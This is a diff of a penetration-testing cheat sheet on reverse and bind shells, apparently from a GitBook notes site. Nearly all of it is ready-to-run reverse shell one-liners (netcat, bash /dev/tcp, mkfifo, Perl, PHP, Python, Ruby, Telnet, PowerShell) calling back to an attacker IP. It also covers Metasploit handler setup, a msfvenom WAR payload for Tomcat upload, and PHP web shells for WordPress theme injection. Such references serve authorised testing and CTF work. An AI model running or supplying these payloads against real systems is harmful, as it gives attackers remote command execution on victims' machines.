@@ -1,75 +1,82 @@
-# shells
+# Shells
 
 ### Best Resource:
 
 {% embed url="https://revshells.com" %}
 
-#### Reverse Shells
+### Reverse Shells
 
 **Listensers**
 
-#### Top Resource
-
-* https://www.revshells.com/
-
 ```
-nc -nlvp 1234
+nc -nlvp 9001
 ```
 
-* Always set up a netcat listener before executing a bash reverse shell
-* You can also use multi handler from metasploit to catch incoming reverse shells
+* Always set up a **netcat** listener before executing a bash reverse shell
+* You can also use **multi/handler** from **metasploit** to catch incoming reverse shells
 
 ```
 msfconsole
 use exploit /multi/handler
 set LHOST 172.16.6.1
-set LPORT 1234
+set LPORT 9001
 run
 ```
 
 **Netcat Reverse Shell**
 
 ```
-nc 172.16.6.1 1234 -e /bin/sh
+nc 172.16.6.1 9001 -e /bin/sh
 ```
 
-* Standard netcat reverse shell (only works with some versions of nc)
+* Standard **netcat** reverse shell (only works with some versions of nc)
 
-**Bash Reverse Shells**
+### **Bash Reverse Shells**
+
+* Good first attempt at a shell.
 
 ```
 bash -i >& /dev/tcp/172.16.6.1/1234 0>&1
 ```
 
-* Basic bash reverse shell
+* Best **bash** reverse shell option, has the highest percentage success rate.&#x20;
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 172.16.6.1 1234 >/tmp/f
 ```
 
-* Another bash reverse shell
-
-**Perl Reverse Shell**
+### **Perl Reverse Shell**
 
 ```
 perl -e 'use Socket;$i="172.16.6.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-**PHP Reverse Shell**
+### **PHP Reverse Shell**
 
 ```
 php -r '$sock=fsockopen("172.16.6.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-* Standard PHP reverse shell typically used for injection on the terminal enviroment or into a web application
+* Standard PHP reverse shell typically used for injection on the terminal environment or into a web application
 
 ```
 $sock=fsockopen("172.16.6.1", 1234);exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 
 * This php shell is used when you can inject php code into a theme file of a CMS (think wordpress)
+* Also have the option of attempting p0wny.php shell for wordpress
 
-**Python Reverse Shell**
+{% embed url="https://github.com/flozz/p0wny-shell/blob/master/shell.php" %}
+p0wny.php download&#x20;
+{% endembed %}
+
+* Most effective is the php-reverse-shell.php when it comes to wordpress and php reverse shells in general&#x20;
+
+{% embed url="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php" %}
+php\__reverse\__shell.php
+{% endembed %}
+
+### **Python Reverse Shell**
 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.6.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -87,7 +94,7 @@ which python3
 * Try the absolute paths when `python3` or `python` are not working to trigger your reverse shell
 * Standard python reverse shell
 
-**Ruby Reverse Shell**
+### **Ruby Reverse Shell**
 
 ```
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("172.16.6.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -101,25 +108,25 @@ ruby -rsocket -e 'c=TCPSocket.new("172.16.6.1","1234");while(cmd=c.gets);IO.pope
 
 * Windows ruby reverse shell
 
-**War Reverse Shell**
+### **War Reverse Shell**
 
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.6.1 LPORT=1234 -f war > /home/kali/Documents/shell.war
 ```
 
-* This will generate a war file for upload on the Tomcat CMS. Once uploaded click on the shell option to activate it.
-* Catch this shell with multi/handler
+* This will generate a war file for upload on the **Tomcat** CMS. Once uploaded click on the shell option to activate it.
+* Catch this shell with **multi/handler** or just **nc**
 
 ```
 msfconsole
 use exploit /multi/handler
-set payload windows/meterpreter/reverse_tcp
+set payload java/jsp_shell_reverse_tcp
 set LHOST 172.16.6.1
 set LPORT 1234
 run
 ```
 
-**Reverse shell over the Telnet Protocol**
+### **Reverse shell over the Telnet Protocol**
 
 ```
 mknod a p; telnet 172.16.6.1 1234 0<a | /bin/sh 1>a
@@ -133,9 +140,9 @@ mknod a p; telnet 172.16.6.1 1234 0<a | /bin/sh 1>a
 powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-#### Bind Shells
+### Bind Shells
 
-**Netcat Bind Shell**
+### **Netcat Bind Shell**
 
 ```
 nc -nlvp 1234 -e /bin/sh
